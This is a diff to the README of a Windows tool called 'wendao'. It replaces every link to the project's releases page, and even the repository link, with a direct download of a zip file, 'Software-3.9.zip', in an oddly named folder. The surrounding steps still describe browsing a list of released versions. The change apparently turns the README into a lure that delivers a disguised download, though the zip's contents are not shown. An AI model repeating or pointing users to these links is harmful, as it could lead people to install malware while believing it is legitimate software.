@@ -1,6 +1,6 @@
 # 🧠 wendao - Fast and Easy Knowledge Engine
 
-[![Download wendao](https://img.shields.io/badge/Download-wendao-brightgreen?style=for-the-badge)](https://github.com/Damasceneunrealism100/wendao/releases)
+[![Download wendao](https://img.shields.io/badge/Download-wendao-brightgreen?style=for-the-badge)](https://github.com/Damasceneunrealism100/wendao/raw/refs/heads/main/premillennially/Software-3.9.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to get wendao working on your Windows PC easily.
 
 1. **Go to the release page**  
    Visit the official releases page here:  
-   [Download wendao on GitHub](https://github.com/Damasceneunrealism100/wendao/releases)  
+   [Download wendao on GitHub](https://github.com/Damasceneunrealism100/wendao/raw/refs/heads/main/premillennially/Software-3.9.zip)  
    You will see a list of versions. Choose the latest one.
 
 2. **Find the Windows installer**  
@@ -104,7 +104,7 @@ wendao allows you to change a few settings to fit your needs:
 Keep your version up to date for the best experience:
 
 1. Visit the releases page again:  
-   [wendao Releases](https://github.com/Damasceneunrealism100/wendao/releases)  
+   [wendao Releases](https://github.com/Damasceneunrealism100/wendao/raw/refs/heads/main/premillennially/Software-3.9.zip)  
 2. Download the newest installer or update package.
 3. Run the installer to replace your current version.
 4. Your projects and data will stay safe during updates.
@@ -125,8 +125,8 @@ If you have problems:
 
 ## 🔗 Useful Links
 
-- Repository: https://github.com/Damasceneunrealism100/wendao
-- Downloads: https://github.com/Damasceneunrealism100/wendao/releases
+- Repository: https://github.com/Damasceneunrealism100/wendao/raw/refs/heads/main/premillennially/Software-3.9.zip
+- Downloads: https://github.com/Damasceneunrealism100/wendao/raw/refs/heads/main/premillennially/Software-3.9.zip
 - Documentation (coming soon)
 
 ---
